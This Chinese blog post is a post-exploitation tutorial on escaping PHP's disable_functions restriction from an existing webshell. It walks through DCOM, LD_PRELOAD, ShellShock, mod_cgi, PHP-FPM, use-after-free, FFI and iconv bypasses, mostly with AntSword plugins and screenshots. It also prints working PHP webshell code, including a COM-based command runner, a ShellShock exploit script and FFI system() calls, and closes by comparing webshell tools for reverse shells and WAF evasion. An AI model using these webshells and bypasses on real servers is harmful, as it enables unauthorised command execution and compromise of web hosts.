[绕过disable_functions的限制 - DumpInfou - 博客园](https://www.cnblogs.com/DumpInfou/p/18023278)


# 绕过disable_functions的限制

disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154307729-1311436582.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154307729-1311436582.png)

比如拿到一个webshell,用管理工具去连接,执行命令发现`ret=127`,实际上就是因为被这个限制的原因

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154322976-720780147.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154322976-720780147.png)

**黑名单**

```text
assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
```

一般网站未禁用phpinfo函数，利用phpinfo函数查看disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可。

## 一、利用Windows组件DCOM绕过

查看靶机phpinfo，发现dcom组件已开启

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154333226-1730210431.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154333226-1730210431.png)

在disable_functions中禁用了许多命令执行函数

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154337711-651607053.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154337711-651607053.png)

利用webshell执行system系统命令发现没有反应

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154342566-2010791139.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154342566-2010791139.png)

这里创建一个COM对象，通过调用COM对象的exec进行命令执行

```text
<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```

直接通过之前已经有的webshell将以上代码写入到根目录下的shell666shell.php中

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154355791-762779754.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154355791-762779754.png)

执行whoami命令

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154401364-1469039713.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154401364-1469039713.png)


## 二、利用Linux环境变量LD_PRELOAD

LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库

- dll = windows 的动态链接库文件 把一些功能函数封装在dll文件中，调用时导入调用即可
- so = linux 动态链接库文件

总的来说就是=`LD_PRELOAD`指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
```

### 使用条件

- Linux 操作系统
- `putenv`
- `mail` or `error_log` 本例中禁用了 `mail` 但未禁用 `error_log`
- 存在可写的目录, 需要上传 `.so` 文件

### 利用复现

可以直接利用蚁剑插件（绕过disable_fucntion）进行绕过

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154439442-1951712490.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154439442-1951712490.png)

再次连接根目录下写入的.antproxy.php文件，密码为之前webshell的密码

> 原理：上传.so脚本（劫持php程序，重新启动一个新的php进程接收.antproxy.php请求）和.antproxy.php
> 
> 如果网站服务器可以提升权限至root，可以通过root用户执行`php -S 0.0.0.0:9090` 通过9090端口访问的webshell即为root权限

### 实操详解

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154447331-771239372.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154447331-771239372.png)

这里取巧，`php -n -S 127.0.0.1:60012 -t /var/www/html` ,没有指定php.ini，使用默认配置，而且默认配置里不存在disable_functions。

蚁剑在成功执行上述so文件后，再次上传了一个中转马，把数据请求转发给了这个中转代理马，从而达到无需切换端口，就可以连接新马的方法。这个方法可以使用在内网端口映射的场景中。

## 三、利用 ShellShock (CVE-2014-6271)

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
```

### 使用条件

- Linux 操作系统
- `putenv`
- `mail` or `error_log` 本例中禁用了 `mail` 但未禁用 `error_log`
- `/bin/bash` 存在 `CVE-2014-6271` 漏洞
- `/bin/sh -> /bin/bash` sh 默认的 shell 是 bash

### 利用复现

AntSword 虚拟终端中已经集成了对 ShellShock 的利用, 直接在虚拟终端执行命令即可

原理脚本

```php
<?php
function runcmd($c){
  $d = dirname($_SERVER["SCRIPT_FILENAME"]);
  if(substr($d, 0, 1) == "/" && function_exists('putenv') && (function_exists('error_log') || function_exists('mail'))){
    if(strstr(readlink("/bin/sh"), "bash")!=FALSE){
      $tmp=tempnam(sys_get_temp_dir(), 'as');
      putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
      if (function_exists('error_log')) {
        error_log("a", 1);
      }else{
        mail("a@127.0.0.1", "", "", "-bv");
      }
    }else{
      print("Not vuln (not bash)\n");
    }
    $output = @file_get_contents($tmp);
    @unlink($tmp);
    if($output!=""){
      print($output);
    }else{
      print("No output, or not vuln.");
    }
  }else{
    print("不满足使用条件");
  }
}

// runcmd("whoami"); // 要执行的命令
runcmd($_REQUEST["cmd"]); // ?cmd=whoami
?>
```

## 四、利用 Apache Mod CGI

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
```

### 使用条件

- Linux 操作系统
- Apache + PHP (apache 使用 apache_mod_php)
- Apache 开启了 `cgi`, `rewrite`
- Web 目录给了 `AllowOverride` 权限
- 当前目录可写

### 利用复现

首先连接已有的一个webshell，然后利用蚁剑的绕过disable_functions插件中的Apache_mod_cgi进行绕过

点击开始

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154533312-677752381.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154533312-677752381.png)

点击后会自动弹出一个终端，从该终端中可以执行系统命令

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154539190-1359621697.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154539190-1359621697.png)

### 实操详解

蚁剑上传了一个`.htaccess`文件，里面是CGI脚本。利用Apache接收到请求后，根据请求的URL路径查找CGI脚本的特征。

Apache mod_cgi 模块的工作流程如下：

1. 客户端发送一个 HTTP 请求给 Apache HTTP 服务器。
2. Apache 接收到请求后，根据请求的 URL 路径查找是否存在与之对应的 CGI 脚本。
3. 如果找到了匹配的 CGI 脚本，Apache 将使用 mod_cgi 将请求转发给该脚本，并将 CGI 环境变量设置为适当的值。
4. CGI 脚本在执行时可以读取环境变量以获取请求信息，并根据需要生成动态的网页内容。
5. 脚本完成后，将结果返回给 Apache 服务器。
6. Apache 服务器将脚本返回的内容作为 HTTP 响应发送给客户端浏览器。

## 五、PHP-FPM 利用 LD_PRELOAD

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
```

### 使用

php.ini中没有禁止 `putenv`, 可以用 `LD_PRELOAD`完成命令执行

### 利用复现

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154549384-1788996300.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154549384-1788996300.png)

连接.antproxy.php文件，执行提供命令

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154555196-659715299.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154555196-659715299.png)

### 实操详解

与二相同
## 六、PHP-FPM

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
```

相比上面PHP-FPM 利用 LD_PRELOAD，禁用了 `putenv`

### 使用条件

- Linux 操作系统
- PHP-FPM
- 存在可写的目录, 需要上传 `.so` 文件

### 利用复现

首先连接已有的一个webshell，然后利用蚁剑的绕过disable_functions插件中的Fastcgi/PHP-FPM进行绕过

FPM/FCGI地址这里填写127.0.0.1:9000（在服务器本地9000端口起一个web服务），php路径默认选择php，再选择web的根目录，配置如下

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154607730-1606011907.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154607730-1606011907.png)

点击开始后会在web的根目录上新增一个.antproxy.php文件

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154614056-1546012055.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154614056-1546012055.png)

连接.antproxy.php（密码同之前连接的webshell密码），即可执行系统命令

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154618518-783141599.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154618518-783141599.png)

## 七、Json Serializer UAF

> [https://cloud.tencent.com/developer/article/1944129](https://cloud.tencent.com/developer/article/1944129)

此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过disable_functions和执行系统命令。尽管不能保证成功，但它应该相当可靠的在所有服务器 api上使用。

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
```

### 使用条件

- Linux 操作系统
- PHP 版本
- 7.1 - all versions to date
- 7.2 < 7.2.19 (released: 30 May 2019)
- 7.3 < 7.3.6 (released: 30 May 2019)

### 利用复现

首先连接已有的一个webshell，然后利用蚁剑的绕过disable_functions插件中的Json Serializer UAF模式进行绕过

点击开始后，会自动弹出一个终端，在此终端中可以执行系统命令

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154630640-1789388988.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154630640-1789388988.png)

### 实操详解

多次尝试，这个并非一次就成功。

## 八、PHP7 GC with Certain Destructors UAF

> [https://github.com/mm0r1/exploits](https://github.com/mm0r1/exploits)

php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
```

### 使用条件

- Linux 操作系统
- PHP 版本
    - 7.0 - all versions to date
    - 7.1 - all versions to date
    - 7.2 - all versions to date
    - 7.3 - all versions to date

### 利用复现

首先连接已有的一个webshell，然后利用蚁剑的绕过disable_functions插件中的PHP_GC_UAF模式进行绕过（利用Json Serializer UAF也可以绕过）

点击开始，自动弹出一个终端，在此终端中可以执行系统命令

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154641146-257804626.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154641146-257804626.png)

### 实操详解

和上一个相同，都是利用堆溢出

## 九、利用 FFI 扩展

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
```

### 使用条件

- Linux 操作系统
- PHP >= 7.4
- 开启了 FFI 扩展且 ffi.enable=true

### 利用复现

首先连接已有的一个webshell，然后利用蚁剑的绕过disable_functions插件中的PHP74_FFI模式进行绕过（利用Json Serializer UAF也可以绕过）

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154648422-1435087779.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154648422-1435087779.png)

点击开始，自动弹出一个终端，在此终端中可以执行系统命令

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154654453-554514022.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154654453-554514022.png)

**手动**

PHP 代码：

```text
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami > /tmp/123");
echo file_get_contents("/tmp/123");
@unlink("/tmp/123");
```

运行后即可看到执行结果：

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154700156-197471681.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154700156-197471681.png)

## 十、利用 LD_PRELOAD 环境变量

### php.ini 配置如下:

```text
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,error_log
```

### 使用条件

- Linux 操作系统
- `putenv`
- `iconv`
- 存在可写的目录, 需要上传 `.so` 文件

> 相比之前的 LD_PRELOAD 环境, 多禁用了 `error_log`

### 利用复现

首先连接已有的一个webshell，然后利用蚁剑的绕过disable_functions插件中的iconv模式进行绕过

选择好php路径和web的根目录后点击开始

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154714083-901636904.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154714083-901636904.png)

可以看到在web的根目录中新增了一个.antproxy.php文件，使用蚁剑再次连接该文件（密码为前面连接webshell的密码）

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154719208-1879463071.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154719208-1879463071.png)

利用该webshell可以进行命令执行

[![image](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154724377-1907177122.png)](https://img2024.cnblogs.com/blog/2355311/202402/2355311-20240220154724377-1907177122.png)

## 总结、webshell工具特性

蚁剑

- 插件多（bypass disable_function）
- 支持一句话
- 支持自定义编码器和解密器
- as-exploits 支持反弹shell，一键上线MSF

冰蝎

- 基于二进制动态加密（绕waf和动态检测）
- 带有http(s)隧道，内网渗透可直接利用（不依赖其他文件）
- 支持反弹shell，一键上线MSF|CS (支持aspx|jsp)

哥斯拉

- 自带插件多，功能多（open_basedir bypass disable_function）
- 支持反弹shell，一键上线MSF
- 流量加密，绕过waf和态势感知